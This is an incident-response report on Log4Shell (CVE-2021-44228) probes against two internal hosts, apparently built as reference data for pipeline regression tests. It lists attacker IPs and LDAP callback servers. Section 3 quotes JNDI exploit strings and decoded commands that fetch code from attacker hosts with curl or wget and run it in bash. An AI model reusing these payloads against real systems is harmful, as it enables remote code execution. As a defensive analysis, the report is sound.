# TrustedSec Log4j Playbook Incident Report

**Investigator:** Lead Incident Response Agent (Regression Test)
**Date:** July 29, 2026
**Source:** PDF-derived reference data (log4j_regex_search-2026-07-28-1.pdf)

---

## §1 — Timeline

| Timestamp (UTC) | Source | Event |
|----------------|--------|-------|
| 2026-07-24 22:48:40 | pcapA.json | First JNDI probe — 195.54.160.149 → 10.0.0.5 (base64 cmd payload) |
| 2026-07-24 22:48:40 | pcapA.json | JNDI probe — 175.6.210.66 → 10.0.0.5 (ldap://121.140.99.236:1389/Exploit) |
| 2026-07-24 22:49:00 | pcapB.json | JNDI probe wave — 4 attacker IPs targeting 10.0.0.6 |
| 2026-07-26 20:18:49 | pcapA.json | Second wave — 195.54.160.149 + 175.6.210.66 |
| 2026-07-26 20:19:13 | pcapB.json | Large wave — 6 attacker IPs, 28 events |
| 2026-07-27 16:44:11 | pcapA.json | Third wave — 195.54.160.149 + 175.6.210.66 |
| 2026-07-27 16:44:33 | pcapB.json | Largest wave — 6 attacker IPs, 56 events |
| 2026-07-28 17:16:59 | pcapA.json | Final pcapA wave |
| 2026-07-28 17:17:22 | pcapB.json | Final pcapB wave — 7 attacker IPs, 56 events |

**Total Activity Window:** 4 days (Jul 24 – Jul 28, 2026)

---

## §2 — Affected Systems

### Potentially Compromised (Internal Targets)
- `10.0.0.5` — Received JNDI probes via HTTP (pcapA)
- `10.0.0.6` — Received JNDI probes via HTTP (pcapB)

### Attacker Infrastructure / C2
| IP Address | Role | Evidence |
|-----------|------|----------|
| `195.54.160.149` | Primary attacker | Base64 cmd payloads on pcapA (8x) + pcapB (20x). Callback on port 12344. Most active IP (56 total events). |
| `175.6.210.66` | Attacker | `ldap://121.140.99.236:1389/Exploit` — pcapA only (8x) |
| `104.248.144.120` | Attacker | `ldap://31.131.16.127:1389/Exploit` — pcapB only (12x) |
| `46.105.95.220` | Attacker | `ldap://31.131.16.127:1389/Exploit` — pcapB only (12x) |
| `5.157.38.50` | Attacker | `ldap://5.101.118.127:1389/Exploit` — pcapB only (12x) |
| `198.71.247.91` | Attacker | Outbound LDAP on port 1389 — pcapB primary (36x), pcapA (12x) |
| `191.232.38.25` | Attacker | Outbound LDAP on port 1389 — pcapB (8x) |
| `107.189.1.178` | Attacker | URI probes — pcapB (4x) |
| `147.182.202.30` | Attacker | Wget/curl downloader payload — pcapB (4x) |

### Callback Endpoints
| Endpoint | Count | Type |
|----------|-------|------|
| `195.54.160.149:12344` | 56 | Base64 command callback (staging server) |
| `31.131.16.127:1389` | 24 | LDAP referral server |
| `5.101.118.127:1389` | 24 | LDAP referral server |
| `121.140.99.236:1389` | 12 | LDAP referral server |
| `71ssmbjqg7ezpoqt8okre7gzu.canarytokens.com` | 4 | Canarytoken (honeypot detection) |

---

## §3 — Exploitation Detection — Log Analysis

### JNDI Exploit Strings Found
Two distinct payload types observed:

1. **Base64-encoded command execution:**
   ```
   ${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwg...}
   ```
   Decodes to: `(curl -s 195.54.160.149:5874/198.71.247.91:80||wget -q -O- 195.54.160.149:5874/198.71.247.91:80)|bash`

2. **Direct LDAP exploit:**
   ```
   ${jndi:ldap://[IP]:1389/Exploit}
   ```

3. **Wget downloader:**
   Base64 decodes to: `/wget http://152.67.63.150/run; curl -O http://152.67.63.150/run; chmod 777 run; ./run`

### Protocol Distribution
- **LDAP / LDAPS (RCE Probe):** 120 total probes
  - pcapA.json: 28
  - pcapB.json: 92

---

## §4 — Exploitation Detection — Network Analysis

### Outbound LDAP/RMI Connections
- Port 1389 observed as primary JNDI callback port
- Multiple external callback servers: `31.131.16.127`, `5.101.118.127`, `121.140.99.236`
- Non-standard callback port: `195.54.160.149:12344` (staging)

### Suspicious User-Agents
- `curl/7.68.0` — used by primary attacker (195.54.160.149)
- `python-requests/2.31` — used by 104.248.144.120
- `Go-http-client/2.0` — used by 46.105.95.220
- `curl/7.74.0` — used by 5.157.38.50

### Canarytoken Detection
- `71ssmbjqg7ezpoqt8okre7gzu.canarytokens.com` — indicates adversary is scanning/hitting honeypots

---

## §5 — Exploitation Detection — Endpoint Analysis

### Inferred from Network Evidence
- `curl` and `wget` download activity indicates post-exploitation staging
- Base64 payloads suggest `bash` execution on target
- Canarytoken hit indicates external scanning awareness

---

## §6 — IP Categorization

| IP Address | Classification | Role | Evidence |
|-----------|---------------|------|----------|
| 10.0.0.5 | Internal | Target | Received JNDI probes via HTTP (pcapA) |
| 10.0.0.6 | Internal | Target | Received JNDI probes via HTTP (pcapB) |
| 195.54.160.149 | External | Primary Attacker / C2 | Base64 cmd payloads, callback on 12344 |
| 175.6.210.66 | External | Attacker | LDAP exploit probe via 121.140.99.236 |
| 104.248.144.120 | External | Attacker | LDAP exploit probe via 31.131.16.127 |
| 46.105.95.220 | External | Attacker | LDAP exploit probe via 31.131.16.127 |
| 5.157.38.50 | External | Attacker | LDAP exploit probe via 5.101.118.127 |
| 198.71.247.91 | External | Attacker | Outbound LDAP on port 1389 |
| 191.232.38.25 | External | Attacker | Outbound LDAP on port 1389 |
| 107.189.1.178 | External | Attacker | URI probe activity |
| 147.182.202.30 | External | Attacker | Wget/curl downloader payload |
| 31.131.16.127:1389 | External | LDAP Callback Server | JNDI referral endpoint |
| 5.101.118.127:1389 | External | LDAP Callback Server | JNDI referral endpoint |
| 121.140.99.236:1389 | External | LDAP Callback Server | JNDI referral endpoint |

---

## §7 — Preventative Recommendations

1. **Upgrade Log4j** to v2.17.0+ on all affected systems
2. **Remove JndiLookup** from classpath for systems that cannot upgrade
3. **Block outbound LDAP/RMI** (ports 389, 636, 1099, 1389) from application servers
4. **Deploy WAF rules** blocking `${jndi:`, `ldap://`, `rmi://` patterns in HTTP headers and bodies
5. **Monitor for canarytoken callbacks** as early warning of active scanning
6. **Investigate compromised hosts** (10.0.0.5, 10.0.0.6) for post-exploitation activity

---

## §8 — Additional Resources

### CVEs
- **CVE-2021-44228** (Log4Shell) — CVSS 10.0, affects Log4j 2.0–2.14.1
- **CVE-2021-45046** — CVSS 9.0, affects Log4j 2.15.0
- **CVE-2021-45105** — CVSS 7.5, affects Log4j 2.16.0

### References
- [TrustedSec Log4j Detection and Response Playbook](https://trustedsec.com/blog/log4j-playbook)
- [CISA Log4j Guidance](https://www.cisa.gov/emergency-directive-22-02)
- [NCSC-NL log4shell scanner](https://github.com/NCSC-NL/log4shell)

---

*Report generated from PDF-derived reference data. Use `tests/fixtures/pdf_splunk_results.json` for mock pipeline testing.*
